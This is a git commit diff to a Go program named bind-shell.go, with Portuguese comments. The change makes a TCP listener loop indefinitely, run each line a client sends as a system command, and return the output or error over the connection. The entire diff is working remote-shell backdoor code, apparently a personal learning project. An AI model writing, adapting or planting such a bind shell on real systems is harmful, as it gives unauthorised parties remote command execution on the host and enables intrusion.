5484b2fbb1bfff98885690eef3e8ba3dc2035bd2
Allan4l <allan4l.cc@gmail.com>
2022-05-05 21:13:10 -0300

    bind-shell.go acrecentado, loop e coreção de travamento ao enviar comando invalido

--- bind-shell.go
+++ bind-shell.go
@@ -27,21 +27,44 @@ func tcpBasico() {
 	receberConexao, erro2 := connect.Accept()
 	err(erro2)
 	fmt.Println("Conexao recibida...")
-	defer connect.Close() //a conexao sera ecerrada apos todo processo ser executao
-	//Organizando os byts da conexao
-	mensagem, erro3 := bufio.NewReader(receberConexao).ReadString('\n')
-	err(erro3)
-	fmt.Println("Msg recibida pelo cliente -> ", mensagem)
 
-	//retorna mensagen ou um comando para o cliente conectado
-	comando := executeCmd(mensagem)
-	receberConexao.Write([]byte(comando))
+	//a conexao sera ecerrada apos todo processo ser executao
+	defer connect.Close()
+
+	for {
+		// loop infinito com for{}
+		//Tranfomando mensagem em string -> bufio.Newreader
+		mensagem, erro3 := bufio.NewReader(receberConexao).ReadString('\n')
+		err(erro3)
+		fmt.Println("Msg recibida pelo cliente -> ", mensagem)
+
+		//retorna mensagen ou um comando para o cliente conectado
+		//Eviando ( mensagem e receberConexao ) como argumento para a func executeCmd
+
+		comando := executeCmd(mensagem, receberConexao)
+		receberConexao.Write([]byte(comando))
+	}
 
 }
 
 //executa comandos do cmd/bash
-func executeCmd(comando string) []byte {
-	retornaComandoParaCliete, _ := exec.Command(strings.TrimSuffix(comando, "\n")).Output()
+//a mensagem vira ( comando e conn net.Conn) no argumento na propria func
+//sendo ( conn e net.Conn seu tipo) assim como o tipo de mensagem e ( string )
+/*
+	Essa parte do codigo junto com a conexao passada por arqgumento
+	resolve o pproblema de travamento do programa, quando eviamos um comando invalido
+	if errCmd != nil {
+		fmt.Fprintf(conn, "%s\n", errCmd)
+	}
+
+*/
+func executeCmd(comando string, conn net.Conn) []byte {
+
+	retornaComandoParaCliete, errCmd := exec.Command(strings.TrimSuffix(comando, "\n")).Output()
+	if errCmd != nil {
+		//informa ao usuario que algo saiu erado
+		fmt.Fprintf(conn, "%s\n", errCmd)
+	}
 	return retornaComandoParaCliete
 }
 
